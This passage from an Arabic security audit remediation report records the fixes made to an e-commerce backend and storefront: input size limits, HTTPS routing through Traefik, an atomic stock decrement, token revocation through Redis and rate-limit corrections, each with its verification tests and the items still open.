**H-7** (غياب الـ validators)، **C-5 + M-4 + M-5** (HTTPS والـ headers والـ proxy)، **H-1** (الأدوار)، **H-4** (سباق المخزون)، **H-2 + H-5** (كشف التوكن وإبطاله)، ثم **M-8، M-10، M-12، M-13، M-2، M-3، M-6، M-7** و**L-1 … L-4**.

---

# ملحق ٣: حالة الإصلاح — H-7

نُفِّذ البند 6 من جدول الأولويات، بثلاث طبقات لا بـ 52 validator.

## لماذا لم تُكتب 52 validator

البحث قبل التنفيذ غيّر الخطة. ثلاثة أرقام:

1. **من أصل 52 command، واحد فقط يُستدعى بلا مصادقة**: `CreateOrderCommand`. الباقي خلف توكن إداري، وحامله يملك أصلاً صلاحية حذف الكتالوج.
2. **`AppDbContext` يحوي 170 استدعاءً لـ `HasMaxLength`** — الحدود معلنة أصلاً، فكتابة validators لها يعني مصدراً ثانياً للحقيقة ينحرف بصمت.
3. **لكن أعمدة `orders` الحرجة بلا حدّ إطلاقاً**: `customer_notes` و`shipping_address1/2` و`notes` و`cancel_reason` من نوع `text`، فـ Postgres يقبل فيها أي طول — وهي بالتحديد ما يكتب فيه المسار غير المصادَق.

## ما نُفِّذ

| الطبقة | التغيير | التغطية |
|---|---|---|
| **١. سقف النقل** | `Program.cs` — سقف Kestrel العام صار 256 ك.ب (`RequestLimits:MaxJsonBodyBytes`)، والـ endpoints الثلاثة للرفع ترفعه لنفسها عبر `[ImageUploadSizeLimit]` | يحمي الخادم قبل قراءة الجسم |
| **٢. خريطة SQLSTATE** | `ExceptionHandlingMiddleware` يحوّل `22001, 22003, 23502, 23503, 23505, 23514` إلى 400/409 | الـ 51 command الإدارية دفعةً واحدة |
| **٣. `CreateOrderValidator`** | داخل `CreateOrderHandler.cs` (وفق عرف المشروع)، برسائل عربية لأنه الأمر الوحيد الذي تصل أخطاؤه إلى مشترٍ | الحقول غير المحدودة على المسار غير المصادَق |

**`[ImageUploadSizeLimit]`** يقرأ الحدّ من `ImageStorageOptions` لا من ثابت مُصرَّف، لأن `[RequestSizeLimit]` القياسية تتطلب قيمة عند الترجمة فتختلف بصمت عن `MaxFileSizeBytes` لحظة تعديله. ومُنفَّذ كـ `IAuthorizationFilter` لأن تلك المرحلة تسبق model binding — وهو الموضع الذي يُقرأ فيه جسم الـ multipart فعلاً.

## خطأ قائم اكتشفه الاختبار — وأُصلح

`ExceptionHandlingMiddleware` كان يستدعي `JsonSerializer.Serialize(response)` **بلا خيارات**، فيُخرج **PascalCase** (`{"Success":false,...}`)، بينما MVC وكل الواجهات تستعمل camelCase.

**الأثر:** كل استجابة خطأ صادرة عن هذا الـ middleware — أي كل 400 تحقق وكل 500 — كانت **غير قابلة للقراءة من الواجهتين**: `data.success` تساوي `undefined`. فالمتجر كان يعرض رسالة احتياطية عامة بدل رسالة الخطأ الحقيقية، في كل مرة.

خطأ سابق لهذا العمل، لكنه كان سيُبطل قيمة الطبقة ٣ بالكامل. أُصلح بـ `PropertyNamingPolicy = JsonNamingPolicy.CamelCase`. ورُبط معه سطر في `client/storefront/features/checkout/api/checkout.api.ts` يُظهر `errors[0]` لتصل رسالة الحقل العربية إلى المشتري بدل «فشل إنشاء الطلب».

## التحقق

- **`dotnet test`: 463 ناجحاً، صفر إخفاق** (456 + 7 في `CreateOrderInputLimitTests`).
- **اختبار طفري:** إزالة قاعدة `CustomerNotes` تُسقط 3 اختبارات، وإرجاع PascalCase يُسقط اختبار الرسالة العربية.
- **برهان الثغرة:** عند إزالة القاعدة، ينجح اختبار «الجسم الضخم مرفوض» في إثبات العكس — أي أن ملاحظة بطول **400,000 حرف تُقبل وتُكتب** في العمود غير المحدود. هذا هو الاستغلال نفسه، مُوثَّقاً كاختبار.
- `typecheck` + `build` + `check:seo` ناجحة، و`lint` **مطابق للأساس** (27 و33).

## حدّ في التغطية يجب أن يُعرف

**سقف النقل (413) غير قابل للاختبار في هذه السويت.** `WebApplicationFactory` يعمل على `TestServer` الذي **لا يطبّق `ConfigureKestrel` إطلاقاً**، فالجسم الضخم يصل إلى الـ validator ويعود 400 بدل 413. الاختبار الحالي يؤكد **الرفض** لا رمزه، والتعليق داخله يحمل أمر `curl` للتحقق من الـ 413 على خادم حقيقي. الطبقة الأولى مُنفَّذة وصحيحة، لكن تأكيدها الآلي يحتاج مضيف Kestrel فعلي.

## توصية اختيارية

`checkout.schema.ts` في المتجر لا يضع حداً على `address1/address2`، بينما الخادم يقصّهما عند 255. فمشترٍ يلصق عنواناً طويلاً سيرى رسالة من الخادم بدل تحقق فوري في الحقل. إضافة `.max(255)` إلى المخططين تجعل التجربة فورية — لم أنفّذها لأنها خارج نطاق H-7.

## ما زال مفتوحاً

**C-5 + M-4 + M-5** (HTTPS والـ headers والـ proxy)، **H-1** (الأدوار)، **H-4** (سباق المخزون)، **H-2 + H-5** (كشف التوكن وإبطاله)، ثم **M-8، M-10، M-12، M-13، M-2، M-3، M-6، M-7** و**L-1 … L-4**.

---

# ملحق ٤: حالة الإصلاح — تجهيز النشر (الفرع `deploy/vm-readiness`)

نُفّذت البنود المتبقية التي تسبق الرفع على الـ VM، في أربع مراحل مستقلة لكلٍّ منها commit.

## أُصلح وتم التحقق منه

| المعرّف | الإصلاح | التحقق |
|---|---|---|
| **C-5** | توجيه Traefik بحسب اسم الموقع (`routes.yml` قالب من `STORE_HOST`/`ADMIN_HOST`)، وHTTPS تلقائي من Let's Encrypt في الإنتاج مع تحويل 80→443، ولا يُنشر إلا 80 و443. أي اسم آخر أو الـ IP المجرد ⇒ 404 | staging: التوجيه والـ 404 والـ CORS. **إصدار الشهادة الفعلي يُتحقق منه عند أول رفع على الـ VM** |
| **M-4** | `AllowedHosts` صار المضيفين العامين + `api`، وأُلغيت CORS خارج التطوير لأن الواجهتين صارتا same-origin | preflight من أصل غريب لا يحمل `Access-Control-Allow-Origin` |
| **M-5** | الثقة بـ `X-Forwarded-For` من ثلاثة عناوين ثابتة فقط (traefik/storefront/admin) بدل `172.16.0.0/12` | انظر «ما اكتُشف أثناء التنفيذ» أدناه |
| **M-12** | كل الحاويات بلا root (`app` UID 1654، و`node`)، وRedis بكلمة مرور وفي نسختين (`redis` بـ noeviction للحالة الأمنية، `redis-cache` بـ allkeys-lru)، وتدوير السجلات | `id` داخل الحاويات، و`NOAUTH` بلا كلمة مرور |
| **M-2** | `appsettings.Development.json` لم يعد متتبَّعاً، و`.dockerignore` يُبقيه خارج الصور. **القيم القديمة باقية في تاريخ git** وتُعامل كمكشوفة | — |
| **H-4** | إنقاص المخزون بعبارة SQL شرطية (`stock >= qty`) داخل معاملة واحدة مع إنشاء الطلب، و`TotalSold` بالطريقة نفسها. إرسال السلة مرتين يُنشئ طلباً واحداً | اختبار يحجز صف المنتج بقفل حتى يصل الطلبان معاً إلى الإنقاص |
| **H-5** | الخروج يُبطل التوكن: `jti` لكل توكن، ويُخزَّن عند الخروج في Redis الأمني لما تبقّى من عمره، ويُرفض أي توكن بلا `jti`. عند تعطّل Redis تُرفض طلبات الإدارة (fail-closed) ويبقى المتجر يعمل. زر الخروج صار ينتظر الطلب قبل `signOut()` | 5 اختبارات على Redis حقيقي (Testcontainers) |
| **M-3** | رقم الطلب 8 محارف من أبجدية بلا التباس بمولّد تشفيري (~8.5×10¹¹ لليوم)، وسياسة rate limit خاصة بالتتبّع (10 / 5 دقائق) تفشل مغلقة | 3 اختبارات على Redis حقيقي |
| **M-10** | تغيّر السعر منذ الإضافة إلى السلة يرفض الطلب برسالة عربية ويحدّث السلة، فيؤكّد المشتري السعر الجديد | اختبار |
| **M-13** | صيغة GUID إلزامية لـ `X-Cart-Session`، ولا تُنشأ سلة عند القراءة، وانتهاء الصلاحية يتجدّد مع كل كتابة، و`ExpiredCartCleanupService` يحذف المنتهي كل 6 ساعات | 7 اختبارات |
| **M-8** | حُذف `MergeCart` بالكامل حتى تُبنى مصادقة للعملاء | اختبار يؤكد 404 لمستدعٍ مصادَق |
| **M-6** | أي `couponCode` غير فارغ يُرفض برسالة «الكوبونات غير متاحة حالياً» | اختبار |
| **M-7** | لا يحتاج إصلاحاً: `dotnet list package --vulnerable` نظيف، و`npm audit --omit=dev` صفر في التطبيقين (2026-09-28) | — |

**اختبار طفري:** أُعيدت كل ثغرة من H-4 وM-10 وH-5 وM-3 وM-13 عمداً وسقط اختبارها، ثم أُعيد الإصلاح.

## ما اكتُشف أثناء التنفيذ — وأُصلح

- **كل زوار المتجر في حصة واحدة.** صفحات المتجر تُجهَّز على السيرفر وتستدعي الـ API من داخل حاوية المتجر، فكان الـ rate limiter يعدّ الموقع كله زائراً واحداً: 10 مشاهدات استهلكت 35 طلباً من حصة 120/دقيقة، أي نحو 34 مشاهدة في الدقيقة لكل الزوار معاً. وتسجيل دخول الإدارة كذلك: كل الموظفين في حصة دخول واحدة، فشخص واحد يخمّن كلمات المرور يقفل الدخول على الجميع. الإصلاح: المتجر ولوحة الإدارة يمرّران `X-Forwarded-For` الخاص بالزائر، والـ API يثق به من عنوانيهما الثابتين فقط. قيس في staging: كل الطلبات في حصة الزائر، و`X-Forwarded-For` مزيّف لا يُنشئ حصة.
- **رسائل الخطأ لم تصل إلى المشتري أصلاً.** axios يرفض كل 4xx قبل قراءة الجسم، فكان المشتري يرى «Request failed with status code 400» بدل السبب — بما فيه رسائل H-7 العربية التي افترض الملحق ٣ أنها تصل. صارت تُستخرج، ويُعرض العربي منها وحده.
- **صفحات بلا قائمة التصنيفات.** `/products` و`/cart` و`/checkout` كانت تُبنى مسبقاً وقت إنشاء صورة Docker حيث لا API، فتُشحن بقائمة فارغة. صار الـ layout يُعرض لكل طلب.
- **الخروج يرسل المستخدم إلى عنوان ميت.** Auth.js يبني عناوينه من العنوان الذي يستمع عليه خادم Next داخل الحاوية (`http://0.0.0.0:3000`)، فكان كل `signOut()` — الخروج، وبعد تغيير كلمة المرور — يوجّه إلى ذلك العنوان. خلل سابق لهذا الفرع؛ أُصلح بضبط `AUTH_URL` من `ADMIN_HOST`. تحقّق في المتصفح: الخروج يصل إلى صفحة الدخول الصحيحة، والتوكن نفسه يُرفض بعده بـ 401.
- **طرق دفع بلا تنفيذ.** الـ API كان يقبل `online` و`bank_transfer` ولا شيء خلفهما. صار `cod` وحده، وهو ما يرسله المتجر.

## ما زال مفتوحاً

- **H-1** (الأدوار): **مقبول كخطر** بقرار المالك — `staff` يملك كل شيء عدا إدارة المستخدمين.
- **H-2** (التوكن مقروء من JavaScript عبر الجلسة): ما زال قائماً. خفّف أثرَه أن الخروج صار يُبطل التوكن، وأن التعطيل وإعادة التعيين يُنهيان الجلسات فوراً.
- **L-1** (`dangerouslyAllowLocalIP`): يُطفأ عند الانتقال إلى R2، لأن الصور المحلية تمر اليوم عبر الـ API الداخلي.
- **L-2، L-3، L-4** كما هي.
